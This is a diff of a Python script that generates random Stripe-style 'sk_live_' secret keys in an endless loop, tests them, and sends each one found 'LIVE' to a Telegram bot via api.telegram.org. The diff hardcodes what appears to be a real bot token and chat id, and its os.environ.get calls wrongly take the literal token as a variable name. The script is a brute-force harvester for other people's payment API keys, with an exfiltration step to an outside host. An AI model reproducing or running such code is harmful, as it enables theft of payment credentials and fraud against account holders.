@@ -1,7 +1,7 @@
 import requests, random, string, time, os
 
-token = os.environ.get("BOT_TOKEN")
-chatid = os.environ.get("FORWARD_ID")
+token = os.environ.get("5091923936:AAEdRRaoX0SKse3f951B4QQ17roZialWXdw")
+chatid = os.environ.get("5091923936")
 
 def long_key():
   skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
@@ -10,7 +10,7 @@ def long_key():
     print(f"DEAD > {skkey}")
   else:
     print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot5091923936:AAEdRRaoX0SKse3f951B4QQ17roZialWXdw/sendMessage?chat_id=bot5091923936&text=LIVE > {skkey}")
     
 def short_key():
   skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
@@ -19,7 +19,7 @@ def short_key():
     print(f"DEAD > {skkey}")
   else:
     print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot5091923936:AAEdRRaoX0SKse3f951B4QQ17roZialWXdw/sendMessage?chat_id=bot5091923936&text=LIVE > {skkey}")
     
 while True:
   long_key()
